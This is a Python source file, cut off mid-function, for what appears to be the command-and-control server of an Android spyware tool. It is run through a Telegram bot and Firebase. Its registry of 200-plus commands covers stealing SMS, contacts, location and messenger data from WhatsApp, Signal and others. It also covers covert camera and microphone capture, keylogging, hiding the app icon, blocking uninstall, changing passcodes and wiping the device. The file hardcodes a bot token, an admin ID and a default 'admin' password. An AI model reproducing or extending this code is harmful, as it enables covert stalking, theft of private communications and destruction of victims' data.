#!/usr/bin/env python3
"""
Abu-Zahra Server - Complete Telegram Bot with Web Dashboard
200+ commands, REST API, getUpdates polling, professional web dashboard.
Uses ONLY aiohttp - no other dependencies besides Python stdlib.
"""

import asyncio
import json
import os
import sys
import time
import uuid
import secrets
import hashlib
import logging
import traceback
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urlparse, parse_qs
from collections import OrderedDict

import aiohttp
from aiohttp import web

# ============================================================================
# CONFIGURATION
# ============================================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8898830696:AAGpgjtwn2cB5wcKQ07PJPXjhKF0Ll43wrs")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7344776596"))
SERVER_PORT = int(os.environ.get("SERVER_PORT", "8443"))
SERVER_DOMAIN = os.environ.get("SERVER_DOMAIN", "https://alsydyabwalzhra.online")
SESSION_SECRET = os.environ.get("SESSION_SECRET", "abu-zahra-secret-key-2025")
DATA_DIR = Path(__file__).parent / "data"

# Firebase Realtime Database
FIREBASE_PROJECT = "studio-7073076148-6afe0"
FIREBASE_RTDB_URL = f"https://{FIREBASE_PROJECT}-default-rtdb.firebaseio.com"
FIREBASE_DB_SECRET = os.environ.get("FIREBASE_DB_SECRET", "")  # من Firebase Console → Project Settings → Service Accounts → Database Secrets

DEVICES_FILE = DATA_DIR / "devices.json"
SESSIONS_FILE = DATA_DIR / "sessions.json"
COMMANDS_FILE = DATA_DIR / "commands.json"
EVENTS_FILE = DATA_DIR / "events.json"
SETTINGS_FILE = DATA_DIR / "settings.json"
LINK_CODES_FILE = DATA_DIR / "link_codes.json"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("abu-zahra")

# ============================================================================
# GLOBAL STATE
# ============================================================================

START_TIME = time.time()
messages_sent = 0
api_hits = 0
tg_offset = 0
_tg_session = None
polling_active = False
server_settings = {}
_processed_update_ids = set()  # منع تكرار معالجة نفس التحديث
_processed_message_keys = set()  # منع تكرار معالجة نفس الرسالة (chat_id:message_id)
_last_message_time = {}  # منع إرسال رسائل مكررة (chat_id -> last_msg_time)
_last_link_code_time = 0  # منع إنشاء أكواد مكررة
_processed_results = set()  # منع إرسال نفس النتيجة مرتين

# حد أدنى بين رسائل البوت لنفس المحادثة (بالثواني)
RATE_LIMIT_SECONDS = 1
# حد أدنى بين إنشاء أكواد الربط (بالثواني)
LINK_CODE_RATE_LIMIT = 3

# ============================================================================
# 200+ COMMAND REGISTRY - organized by category
# ============================================================================

COMMAND_REGISTRY = {
    # Data Collection (20)
    "sms":              {"cat": "data",    "cmd": "get_sms",              "desc": "📲 جلب الرسائل SMS",            "emoji": "📲"},
    "calls":            {"cat": "data",    "cmd": "get_calls",            "desc": "📞 جلب سجل المكالمات",          "emoji": "📞"},
    "contacts":         {"cat": "data",    "cmd": "get_contacts",         "desc": "📇 جلب جهات الاتصال",            "emoji": "📇"},
    "location":         {"cat": "data",    "cmd": "get_location",         "desc": "📍 جلب الموقع الجغرافي",        "emoji": "📍"},
    "notifications":    {"cat": "data",    "cmd": "get_notifications",    "desc": "🔔 جلب الإشعارات",              "emoji": "🔔"},
    "apps":             {"cat": "data",    "cmd": "get_apps",             "desc": "📱 جلب التطبيقات المثبتة",      "emoji": "📱"},
    "info":             {"cat": "data",    "cmd": "get_info",             "desc": "ℹ️ معلومات الجهاز",             "emoji": "ℹ️"},
    "battery":          {"cat": "data",    "cmd": "get_battery",          "desc": "🔋 حالة البطارية",              "emoji": "🔋"},
    "gallery":          {"cat": "data",    "cmd": "get_gallery",          "desc": "🖼️ المعرض",                     "emoji": "🖼️"},
    "clipboard":        {"cat": "data",    "cmd": "get_clipboard",        "desc": "📋 الحافظة",                    "emoji": "📋"},
    "all_data":         {"cat": "data",    "cmd": "get_all",         "desc": "📥 جميع البيانات",               "emoji": "📥"},
    "wifi_info":        {"cat": "data",    "cmd": "get_wifi_info",        "desc": "📶 معلومات الواي فاي",          "emoji": "📶"},
    "bluetooth_devices":{"cat": "data",    "cmd": "get_info",        "desc": "🔵 أجهزة البلوتوث",             "emoji": "🔵"},
    "network_info":     {"cat": "data",    "cmd": "get_network_info",     "desc": "🌐 معلومات الشبكة",             "emoji": "🌐"},
    "sim_info":         {"cat": "data",    "cmd": "get_sim_info",         "desc": "📱 معلومات الشريحة",            "emoji": "📱"},
    "storage_info":     {"cat": "data",    "cmd": "get_storage_info",     "desc": "💾 معلومات التخزين",            "emoji": "💾"},
    "installed_apps":   {"cat": "data",    "cmd": "get_installed_apps",   "desc": "📦 التطبيقات المثبتة",          "emoji": "📦"},
    "running_apps":     {"cat": "data",    "cmd": "get_running_apps",     "desc": "⚡ التطبيقات النشطة",           "emoji": "⚡"},
    "calendar":         {"cat": "data",    "cmd": "get_calendar",         "desc": "📅 التقويم",                    "emoji": "📅"},
    "browser_history":  {"cat": "data",    "cmd": "get_browser_history",  "desc": "🌍 سجل المتصفح",               "emoji": "🌍"},

    # Social Media (15)
    "whatsapp":         {"cat": "social",  "cmd": "get_whatsapp",         "desc": "💬 واتساب",                     "emoji": "💬"},
    "telegram_app":     {"cat": "social",  "cmd": "get_telegram",         "desc": "✈️ تليجرام",                    "emoji": "✈️"},
    "instagram":        {"cat": "social",  "cmd": "get_instagram",        "desc": "📷 انستجرام",                   "emoji": "📷"},
    "messenger":        {"cat": "social",  "cmd": "get_messenger",        "desc": "📘 ماسنجر",                     "emoji": "📘"},
    "snapchat":         {"cat": "social",  "cmd": "get_snapchat",         "desc": "👻 سناب شات",                   "emoji": "👻"},
    "tiktok":           {"cat": "social",  "cmd": "get_tiktok",           "desc": "🎵 تيك توك",                    "emoji": "🎵"},
    "twitter":          {"cat": "social",  "cmd": "get_twitter",          "desc": "🐦 تويتر / X",                  "emoji": "🐦"},
    "viber":            {"cat": "social",  "cmd": "get_viber",            "desc": "💜 فايبر",                      "emoji": "💜"},
    "signal":           {"cat": "social",  "cmd": "get_signal",           "desc": "🟢 سيجنال",                     "emoji": "🟢"},
    "facebook":         {"cat": "social",  "cmd": "get_facebook",         "desc": "📘 فيسبوك",                     "emoji": "📘"},
    "whatsapp_status":  {"cat": "social",  "cmd": "get_whatsapp",  "desc": "📝 حالات واتساب",              "emoji": "📝"},
    "whatsapp_stories": {"cat": "social",  "cmd": "get_whatsapp", "desc": "📖 قصص واتساب",                "emoji": "📖"},
    "telegram_channels":{"cat": "social",  "cmd": "get_telegram","desc": "📺 قنوات تليجرام",             "emoji": "📺"},
    "instagram_stories":{"cat": "social",  "cmd": "get_instagram","desc": "📸 قصص انستجرام",              "emoji": "📸"},
    "youtube":          {"cat": "social",  "cmd": "get_tiktok",          "desc": "▶️ يوتيوب",                     "emoji": "▶️"},

    # Remote Control (40)
    "ping":             {"cat": "control", "cmd": "ping",                 "desc": "📡 فحص الاتصال",               "emoji": "📡"},
    "vibrate":          {"cat": "control", "cmd": "vibrate",              "desc": "📳 اهتزاز",                     "emoji": "📳"},
    "ring":             {"cat": "control", "cmd": "ring",                 "desc": "🔔 رنين",                      "emoji": "🔔"},
    "screenshot":       {"cat": "control", "cmd": "screenshot",           "desc": "📸 لقطة شاشة",                 "emoji": "📸"},
    "front_camera":     {"cat": "control", "cmd": "front_camera",         "desc": "📷 كاميرا أمامية",             "emoji": "📷"},
    "back_camera":      {"cat": "control", "cmd": "back_camera",          "desc": "📷 كاميرا خلفية",              "emoji": "📷"},
    "record_audio":     {"cat": "control", "cmd": "record_audio",         "desc": "🎙️ تسجيل صوتي",               "emoji": "🎙️"},
    "record_video":     {"cat": "control", "cmd": "record_screen",         "desc": "🎬 تسجيل فيديو",               "emoji": "🎬"},
    "lock_phone":       {"cat": "control", "cmd": "lock_phone",           "desc": "🔒 قفل الهاتف",                "emoji": "🔒"},
    "unlock_phone":     {"cat": "control", "cmd": "unlock_phone",         "desc": "🔓 فتح الهاتف",                "emoji": "🔓"},
    "reboot":           {"cat": "control", "cmd": "reboot",               "desc": "🔄 إعادة تشغيل",              "emoji": "🔄"},
    "shutdown":         {"cat": "control", "cmd": "shutdown",             "desc": "⏻ إيقاف التشغيل",             "emoji": "⏻"},
    "set_volume":       {"cat": "control", "cmd": "set_volume",           "desc": "🔊 تعيين الصوت",               "emoji": "🔊"},
    "set_brightness":   {"cat": "control", "cmd": "set_brightness",       "desc": "☀️ تعيين السطوع",              "emoji": "☀️"},
    "set_ringtone":     {"cat": "control", "cmd": "ping",         "desc": "🔔 تعيين النغمة",               "emoji": "🔔"},
    "set_wallpaper":    {"cat": "control", "cmd": "set_wallpaper",        "desc": "🖼️ تعيين الخلفية",             "emoji": "🖼️"},
    "enable_wifi":      {"cat": "control", "cmd": "enable_wifi",          "desc": "📶 تشغيل الواي فاي",           "emoji": "📶"},
    "disable_wifi":     {"cat": "control", "cmd": "disable_wifi",         "desc": "📵 إيقاف الواي فاي",           "emoji": "📵"},
    "enable_bluetooth": {"cat": "control", "cmd": "enable_bluetooth",     "desc": "🔵 تشغيل البلوتوث",            "emoji": "🔵"},
    "disable_bluetooth":{"cat": "control", "cmd": "disable_bluetooth",    "desc": "❌ إيقاف البلوتوث",            "emoji": "❌"},
    "enable_mobile_data":{"cat": "control","cmd": "enable_mobile_data",   "desc": "📶 تشغيل بيانات الجوال",       "emoji": "📶"},
    "disable_mobile_data":{"cat":"control","cmd": "disable_mobile_data",  "desc": "📵 إيقاف بيانات الجوال",       "emoji": "📵"},
    "enable_hotspot":   {"cat": "control", "cmd": "enable_hotspot",       "desc": "📡 تشغيل نقطة الاتصال",        "emoji": "📡"},
    "disable_hotspot":  {"cat": "control", "cmd": "disable_hotspot",      "desc": "📵 إيقاف نقطة الاتصال",        "emoji": "📵"},
    "airplane_on":      {"cat": "control", "cmd": "airplane_on",          "desc": "✈️ وضع الطيران - تشغيل",      "emoji": "✈️"},
    "airplane_off":     {"cat": "control", "cmd": "airplane_off",         "desc": "📱 وضع الطيران - إيقاف",      "emoji": "📱"},
    "auto_rotate_on":   {"cat": "control", "cmd": "set_auto_rotate",       "desc": "🔄 الدوران التلقائي - تشغيل", "emoji": "🔄"},
    "auto_rotate_off":  {"cat": "control", "cmd": "set_auto_rotate",      "desc": "🔒 الدوران التلقائي - إيقاف", "emoji": "🔒"},
    "torch_on":         {"cat": "control", "cmd": "torch_on",             "desc": "🔦 تشغيل الكشاف",              "emoji": "🔦"},
    "torch_off":        {"cat": "control", "cmd": "torch_off",            "desc": "🔦 إطفاء الكشاف",              "emoji": "🔦"},
    "play_sound":       {"cat": "control", "cmd": "play_sound",           "desc": "🔊 تشغيل صوت",                "emoji": "🔊"},
    "speak_text":       {"cat": "control", "cmd": "speak_text",           "desc": "🗣️ نطق نص",                   "emoji": "🗣️"},
    "show_notification":{"cat": "control", "cmd": "ping",    "desc": "🔔 إظهار إشعار",              "emoji": "🔔"},
    "open_url":         {"cat": "control", "cmd": "ping",             "desc": "🌐 فتح رابط",                  "emoji": "🌐"},
    "send_sms":         {"cat": "control", "cmd": "send_sms",             "desc": "📲 إرسال رسالة SMS",           "emoji": "📲"},
    "make_call":        {"cat": "control", "cmd": "make_call",            "desc": "📞 إجراء مكالمة",              "emoji": "📞"},
    "block_number":     {"cat": "control", "cmd": "ping",         "desc": "🚫 حظر رقم",                  "emoji": "🚫"},
    "unblock_number":   {"cat": "control", "cmd": "ping",       "desc": "✅ إلغاء حظر رقم",             "emoji": "✅"},

    # App Management (20)
    "open_app":         {"cat": "apps",    "cmd": "open_app",             "desc": "📱 فتح تطبيق",                 "emoji": "📱"},
    "close_app":        {"cat": "apps",    "cmd": "close_app",            "desc": "❌ إغلاق تطبيق",               "emoji": "❌"},
    "install_app":      {"cat": "apps",    "cmd": "install_app",          "desc": "📥 تثبيت تطبيق",               "emoji": "📥"},
    "uninstall_app":    {"cat": "apps",    "cmd": "uninstall_app",        "desc": "🗑️ حذف تطبيق",                "emoji": "🗑️"},
    "block_app":        {"cat": "apps",    "cmd": "block_app",            "desc": "🚫 حظر تطبيق",                "emoji": "🚫"},
    "unblock_app":      {"cat": "apps",    "cmd": "unblock_app",          "desc": "✅ إلغاء حظر تطبيق",           "emoji": "✅"},
    "clear_app_data":   {"cat": "apps",    "cmd": "clear_app_data",       "desc": "🧹 مسح بيانات تطبيق",         "emoji": "🧹"},
    "force_stop_app":   {"cat": "apps",    "cmd": "force_stop_app",       "desc": "⛔ إيقاف قسري",               "emoji": "⛔"},
    "app_info":         {"cat": "apps",    "cmd": "get_info",             "desc": "ℹ️ معلومات تطبيق",            "emoji": "ℹ️"},
    "app_usage":        {"cat": "apps",    "cmd": "get_running_apps",            "desc": "📊 استخدام التطبيقات",        "emoji": "📊"},
    "screen_time":      {"cat": "apps",    "cmd": "get_app_usage",          "desc": "⏱️ وقت الشاشة",               "emoji": "⏱️"},
    "app_permissions":  {"cat": "apps",    "cmd": "get_info",      "desc": "🔐 صلاحيات التطبيق",          "emoji": "🔐"},
    "enable_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "✅ تفعيل تطبيق",              "emoji": "✅"},
    "disable_app":      {"cat": "apps",    "cmd": "close_app",          "desc": "❌ تعطيل تطبيق",              "emoji": "❌"},
    "list_blocked":     {"cat": "apps",    "cmd": "get_info",         "desc": "📋 قائمة التطبيقات المحظورة",  "emoji": "📋"},
    "clear_cache":      {"cat": "apps",    "cmd": "clear_app_data",          "desc": "🧹 مسح الكاش",                "emoji": "🧹"},
    "update_app":       {"cat": "apps",    "cmd": "install_app",           "desc": "⬆️ تحديث تطبيق",              "emoji": "⬆️"},
    "launch_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "🚀 تشغيل تطبيق",              "emoji": "🚀"},
    "kill_app":         {"cat": "apps",    "cmd": "force_stop_app",             "desc": "💀 إنهاء تطبيق",               "emoji": "💀"},
    "app_cache":        {"cat": "apps",    "cmd": "clear_app_data",            "desc": "💾 كاش التطبيقات",             "emoji": "💾"},

    # File Management (25)
    "list_files":       {"cat": "files",   "cmd": "list_files",           "desc": "📂 عرض الملفات",               "emoji": "📂"},
    "get_file":         {"cat": "files",   "cmd": "get_file",             "desc": "📄 جلب ملف",                  "emoji": "📄"},
    "download_file":    {"cat": "files",   "cmd": "get_file",        "desc": "⬇️ تحميل ملف",                "emoji": "⬇️"},
    "list_downloads":   {"cat": "files",   "cmd": "list_files",       "desc": "📥 مجلد التحميلات",            "emoji": "📥"},
    "list_dcim":        {"cat": "files",   "cmd": "list_files",            "desc": "📸 مجلد DCIM",                "emoji": "📸"},
    "list_music":       {"cat": "files",   "cmd": "list_files",           "desc": "🎵 مجلد الموسيقى",            "emoji": "🎵"},
    "list_videos":      {"cat": "files",   "cmd": "list_files",          "desc": "🎬 مجلد الفيديوهات",          "emoji": "🎬"},
    "list_documents":   {"cat": "files",   "cmd": "list_files",       "desc": "📁 مجلد المستندات",            "emoji": "📁"},
    "list_whatsapp":    {"cat": "files",   "cmd": "list_files",  "desc": "💬 ملفات واتساب",             "emoji": "💬"},
    "list_telegram_files":{"cat":"files",  "cmd": "list_files",  "desc": "✈️ ملفات تليجرام",            "emoji": "✈️"},
    "send_contacts_backup":{"cat":"files", "cmd": "send_backup_contacts", "desc": "📇 نسخة جهات الاتصال",          "emoji": "📇"},
    "send_sms_backup":  {"cat": "files",   "cmd": "send_backup_sms",      "desc": "📲 نسخة الرسائل",              "emoji": "📲"},
    "send_calls_backup":{"cat": "files",   "cmd": "send_backup_calls",    "desc": "📞 نسخة المكالمات",            "emoji": "📞"},
    "send_whatsapp_backup":{"cat":"files", "cmd": "send_backup_whatsapp", "desc": "💬 نسخة واتساب",               "emoji": "💬"},
    "send_full_backup": {"cat": "files",   "cmd": "send_backup_all",     "desc": "💾 نسخة احتياطية كاملة",       "emoji": "💾"},
    "delete_file":      {"cat": "files",   "cmd": "delete_file",          "desc": "🗑️ حذف ملف",                  "emoji": "🗑️"},
    "rename_file":      {"cat": "files",   "cmd": "list_files",          "desc": "✏️ إعادة تسمية ملف",          "emoji": "✏️"},
    "copy_file":        {"cat": "files",   "cmd": "list_files",            "desc": "📋 نسخ ملف",                  "emoji": "📋"},
    "move_file":        {"cat": "files",   "cmd": "list_files",            "desc": "📦 نقل ملف",                  "emoji": "📦"},
    "create_folder":    {"cat": "files",   "cmd": "list_files",        "desc": "📁 إنشاء مجلد",               "emoji": "📁"},
    "get_folder_size":  {"cat": "files",   "cmd": "list_files",      "desc": "📏 حجم المجلد",               "emoji": "📏"},
    "search_files":     {"cat": "files",   "cmd": "list_files",         "desc": "🔍 بحث في الملفات",           "emoji": "🔍"},
    "recent_files":     {"cat": "files",   "cmd": "list_files",         "desc": "🕐 الملفات الأخيرة",           "emoji": "🕐"},
    "file_info":        {"cat": "files",   "cmd": "list_files",            "desc": "ℹ️ معلومات ملف",              "emoji": "ℹ️"},
    "zip_files":        {"cat": "files",   "cmd": "list_files",            "desc": "📦 ضغط ملفات",                "emoji": "📦"},

    # Security & Admin (15)
    "wipe_data":        {"cat": "security","cmd": "wipe_data",            "desc": "💣 مسح البيانات",              "emoji": "💣"},
    "factory_reset":    {"cat": "security","cmd": "factory_reset",        "desc": "⚠️ إعادة ضبط المصنع",         "emoji": "⚠️"},
    "show_app":         {"cat": "security","cmd": "show_app",             "desc": "👁️ إظهار أيقونة التطبيق",     "emoji": "👁️"},
    "hide_app":         {"cat": "security","cmd": "hide_app",             "desc": "🙈 إخفاء أيقونة التطبيق",     "emoji": "🙈"},
    "change_passcode":  {"cat": "security","cmd": "change_passcode",      "desc": "🔑 تغيير رمز القفل",          "emoji": "🔑"},
    "set_pin":          {"cat": "security","cmd": "change_passcode",              "desc": "🔢 تعيين رقم PIN",             "emoji": "🔢"},
    "remove_pin":       {"cat": "security","cmd": "change_passcode",           "desc": "🔓 إزالة رقم PIN",             "emoji": "🔓"},
    "enable_biometric": {"cat": "security","cmd": "change_passcode",     "desc": "👤 تشغيل البصمة",             "emoji": "👤"},
    "disable_biometric":{"cat": "security","cmd": "change_passcode",    "desc": "❌ إيقاف البصمة",             "emoji": "❌"},
    "anti_uninstall_on":{"cat": "security","cmd": "change_passcode",    "desc": "🛡️ الحماية من الحذف - تشغيل", "emoji": "🛡️"},
    "anti_uninstall_off":{"cat":"security","cmd": "change_passcode",   "desc": "⛔ الحماية من الحذف - إيقاف", "emoji": "⛔"},
    "device_admin_status":{"cat":"security","cmd":"device_admin_status",  "desc": "📋 حالة مسؤول الجهاز",        "emoji": "📋"},
    "check_root":       {"cat": "security","cmd": "get_info",           "desc": "🧪 فحص الروت",                "emoji": "🧪"},
    "set_screen_lock":  {"cat": "security","cmd": "lock_phone",      "desc": "🔒 تعيين قفل الشاشة",         "emoji": "🔒"},
    "remove_screen_lock":{"cat":"security","cmd":"remove_screen_lock",    "desc": "🔓 إزالة قفل الشاشة",         "emoji": "🔓"},

    # Monitoring (20)
    "keylogger_start":  {"cat": "monitor", "cmd": "keylogger_start",      "desc": "⌨️ بدء تسجيل المفاتيح",        "emoji": "⌨️"},
    "keylogger_stop":   {"cat": "monitor", "cmd": "keylogger_stop",       "desc": "⏹️ إيقاف تسجيل المفاتيح",     "emoji": "⏹️"},
    "get_keylogger":    {"cat": "monitor", "cmd": "get_keylogger",        "desc": "📥 جلب بيانات لوحة المفاتيح",   "emoji": "📥"},
    "screen_record_start":{"cat":"monitor","cmd":"screen_record_start",   "desc": "🔴 بدء تسجيل الشاشة",         "emoji": "🔴"},
    "screen_record_stop":{"cat": "monitor","cmd": "stop_screen",   "desc": "⏹️ إيقاف تسجيل الشاشة",       "emoji": "⏹️"},
    "clipboard_monitor_start":{"cat":"monitor","cmd":"clipboard_monitor_start","desc":"📋 بدء مراقبة الحافظة","emoji":"📋"},
    "clipboard_monitor_stop":{"cat":"monitor","cmd":"clipboard_monitor_stop","desc":"⏹️ إيقاف مراقبة الحافظة","emoji":"⏹️"},
    "get_clipboard_log":{"cat": "monitor", "cmd": "get_clipboard",    "desc": "📋 سجل الحافظة",               "emoji": "📋"},
    "wifi_monitor_start":{"cat": "monitor", "cmd": "get_wifi_info",  "desc": "📡 بدء مراقبة الواي فاي",     "emoji": "📡"},
    "wifi_monitor_stop":{"cat": "monitor", "cmd": "get_wifi_info",   "desc": "⏹️ إيقاف مراقبة الواي فاي",   "emoji": "⏹️"},
    "app_monitor_start":{"cat": "monitor", "cmd": "get_running_apps",    "desc": "📱 بدء مراقبة التطبيقات",      "emoji": "📱"},
    "app_monitor_stop": {"cat": "monitor", "cmd": "get_running_apps",     "desc": "⏹️ إيقاف مراقبة التطبيقات",   "emoji": "⏹️"},
    "get_app_log":      {"cat": "monitor", "cmd": "get_running_apps",          "desc": "📋 سجل التطبيقات",             "emoji": "📋"},
    "location_live":    {"cat": "monitor", "cmd": "location_live",        "desc": "🗺️ تتبع مباشر",               "emoji": "🗺️"},
    "location_stop":    {"cat": "monitor", "cmd": "location_stop",        "desc": "⏹️ إيقاف التتبع",             "emoji": "⏹️"},
    "location_history": {"cat": "monitor", "cmd": "get_location",     "desc": "📜 سجل المواقع",              "emoji": "📜"},
    "geo_add":          {"cat": "monitor", "cmd": "get_location",              "desc": "➕ إضافة منطقة جغرافية",       "emoji": "➕"},
    "geo_remove":       {"cat": "monitor", "cmd": "get_location",           "desc": "➖ حذف منطقة جغرافية",         "emoji": "➖"},
    "geo_list":         {"cat": "monitor", "cmd": "get_location",             "desc": "📋 قائمة المناطق الجغرافية",   "emoji": "📋"},
    "sms_monitor":      {"cat": "monitor", "cmd": "get_sms",          "desc": "📲 مراقبة الرسائل",            "emoji": "📲"},
    "call_monitor":     {"cat": "monitor", "cmd": "get_calls",         "desc": "📞 مراقبة المكالمات",          "emoji": "📞"},

    # System Settings (15)
    "set_language":     {"cat": "syssettings", "cmd": "get_info",     "desc": "🌐 تعيين اللغة",               "emoji": "🌐"},
    "set_timezone":     {"cat": "syssettings", "cmd": "get_info",     "desc": "🕐 تعيين المنطقة الزمنية",     "emoji": "🕐"},
    "set_alarm":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏰ تعيين منبه",                "emoji": "⏰"},
    "set_timer":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏱️ تعيين مؤقت",               "emoji": "⏱️"},
    "set_reminder":     {"cat": "syssettings", "cmd": "set_alarm",     "desc": "📝 تعيين تذكير",              "emoji": "📝"},
    "enable_dev_mode":  {"cat": "syssettings", "cmd": "get_info",  "desc": "🔧 تشغيل وضع المطور",         "emoji": "🔧"},
    "disable_dev_mode": {"cat": "syssettings", "cmd": "get_info", "desc": "❌ إيقاف وضع المطور",         "emoji": "❌"},
    "enable_usb_debug": {"cat": "syssettings", "cmd": "get_info", "desc": "🔌 تشغيل تصحيح USB",          "emoji": "🔌"},
    "disable_usb_debug":{"cat": "syssettings", "cmd": "get_info","desc": "❌ إيقاف تصحيح USB",          "emoji": "❌"},
    "dns_change":       {"cat": "syssettings", "cmd": "get_network_info",       "desc": "🌐 تغيير DNS",               "emoji": "🌐"},
    "proxy_set":        {"cat": "syssettings", "cmd": "get_network_info",        "desc": "🔀 تعيين بروكسي",             "emoji": "🔀"},
    "apn_settings":     {"cat": "syssettings", "cmd": "get_network_info",     "desc": "📶 إعدادات APN",             "emoji": "📶"},
    "nfc_on":           {"cat": "syssettings", "cmd": "get_info",           "desc": "📡 تشغيل NFC",               "emoji": "📡"},
    "nfc_off":          {"cat": "syssettings", "cmd": "get_info",          "desc": "❌ إيقاف NFC",               "emoji": "❌"},
    "auto_update_on":   {"cat": "syssettings", "cmd": "get_info",   "desc": "⬆️ التحديث التلقائي - تشغيل", "emoji": "⬆️"},
    "auto_update_off":  {"cat": "syssettings", "cmd": "get_info",  "desc": "⏸️ التحديث التلقائي - إيقاف", "emoji": "⏸️"},
}

# ============================================================================
# DATA HELPERS
# ============================================================================

def ensure_data_dir():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    defaults = {
        DEVICES_FILE: [],
        SESSIONS_FILE: [],
        COMMANDS_FILE: [],
        EVENTS_FILE: [],
        SETTINGS_FILE: {
            "admin_password": "admin",
            "sync_interval": 300,
            "location_interval": 60,
            "auto_location": True,
            "auto_sync": True,
            "language": "ar",
            "notifications": True,
            "keylogger": False,
            "sim_detect": False,
            "wifi_monitor": False,
            "geofences": [],
        },
        LINK_CODES_FILE: [],
    }
    for fpath, default in defaults.items():
        if not fpath.exists():
            fpath.write_text(json.dumps(default, ensure_ascii=False, indent=2))


def load_json(path, default=None):
    try:
        if path.exists():
            return json.loads(path.read_text())
    except Exception as exc:
        log.error("Failed to load %s: %s", path, exc)
    return default if default is not None else []


def save_json(path, data):
    try:
        path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
    except Exception as exc:
        log.error("Failed to save %s: %s", path, exc)


def append_event(event, details=None, level="info"):
    events = load_json(EVENTS_FILE, [])
    events.append({
        "time": datetime.now(timezone.utc).isoformat(),
        "event": event,
        "details": details or {},
        "level": level,
    })
    if len(events) > 2000:
        events = events[-2000:]
    save_json(EVENTS_FILE, events)


def load_settings():
    return load_json(SETTINGS_FILE, {
        "admin_password": "admin",
        "sync_interval": 300,
        "location_interval": 60,
        "auto_location": True,
        "auto_sync": True,
        "language": "ar",
        "notifications": True,
        "keylogger": False,
        "sim_detect": False,
        "wifi_monitor": False,
        "geofences": [],
    })


def save_settings_data(settings):
    save_json(SETTINGS_FILE, settings)


def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def get_uptime():
    return int(time.time() - START_TIME)


def format_uptime(seconds):
    d = seconds // 86400
    h = (seconds % 86400) // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)

# ============================================================================
# DEVICE HELPERS
# ============================================================================

def get_devices():
    return load_json(DEVICES_FILE, [])


def save_devices(devices):
    save_json(DEVICES_FILE, devices)


def find_device(device_id):
    for d in get_devices():
        if d.get("id") == device_id:
            return d
    return None


def update_device(device_id, updates):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_id:
            d.update(updates)
            d["last_seen"] = ts()
            devices[i] = d
            save_devices(devices)
            return d
    return None


def add_device(device_data):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_data.get("id"):
            device_data["last_seen"] = ts()
            devices[i] = device_data
            save_devices(devices)
            return device_data
    device_data["last_seen"] = ts()
    device_data["created_at"] = ts()
    devices.append(device_data)
    save_devices(devices)
    append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
    return device_data


def remove_device(device_id):
    devices = get_devices()
    new_devices = [d for d in devices if d.get("id") != device_id]
    if len(new_devices) == len(devices):
        return False
    save_devices(new_devices)
    append_event("Device removed", {"id": device_id})
    return True


def get_first_device():
    devices = get_devices()
    return devices[0] if devices else None

# ============================================================================
# COMMAND QUEUE HELPERS
# ============================================================================

def queue_command(device_id, command, params=None):
    commands = load_json(COMMANDS_FILE, [])
    cmd = {
        "id": str(uuid.uuid4())[:8],
        "device_id": device_id,
        "command": command,
        "params": params or {},
        "status": "pending",
        "created_at": ts(),
        "sent_at": None,
        "result": None,
    }
    commands.append(cmd)
    if len(commands) > 1000:
        commands = commands[-1000:]
    save_json(COMMANDS_FILE, commands)
    append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
    firebase_push_command(cmd)
    return cmd


def get_pending_commands(device_id):
    commands = load_json(COMMANDS_FILE, [])
    return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]


def update_command_status(cmd_id, status, result=None):
    commands = load_json(COMMANDS_FILE, [])
    for i, c in enumerate(commands):
        if c.get("id") == cmd_id:
            commands[i]["status"] = status
            commands[i]["result"] = result
            commands[i]["completed_at"] = ts()
            save_json(COMMANDS_FILE, commands)
            return commands[i]
    return None

# ============================================================================
# SESSION HELPERS
# ============================================================================

def create_session(username, password, ip="", ua=""):
    settings = load_settings()
    if password != settings.get("admin_password", "admin"):
        return None
    sessions = load_json(SESSIONS_FILE, [])
    token = secrets.token_urlsafe(32)
    session = {
        "token": token,
        "username": username,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=24)).isoformat(),
        "ip": ip,
        "user_agent": ua,
    }
    sessions.append(session)
    if len(sessions) > 100:
        sessions = sessions[-100:]
    save_json(SESSIONS_FILE, sessions)
    append_event("Web login", {"username": username, "ip": ip})
    return session


def validate_session(token):
    sessions = load_json(SESSIONS_FILE, [])
    now = datetime.now(timezone.utc)
    for s in sessions:
        if s.get("token") == token:
            try:
                expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                if now > expires:
                    return None
            except:
                return None
            return s
    return None


def delete_session(token):
    sessions = load_json(SESSIONS_FILE, [])
    new_sessions = [s for s in sessions if s.get("token") != token]
    save_json(SESSIONS_FILE, new_sessions)

# ============================================================================
# LINK CODE HELPERS (Firebase Realtime Database + Local)
# ============================================================================

async def firebase_get(path):
    """GET data from Firebase RTDB.
    يعمل بدون مصادقة إذا كانت القواعد تسمح بالوصول العام.
    أو مع Database Secret إذا تم تعيين FIREBASE_DB_SECRET."""
    try:
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if FIREBASE_DB_SECRET:
            url += f"?auth={FIREBASE_DB_SECRET}"
        session = get_tg_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json()
                log.debug("Firebase GET %s OK", path)
                return data
            else:
                log.warning("Firebase GET %s returned status %d", path, resp.status)
    except Exception as exc:
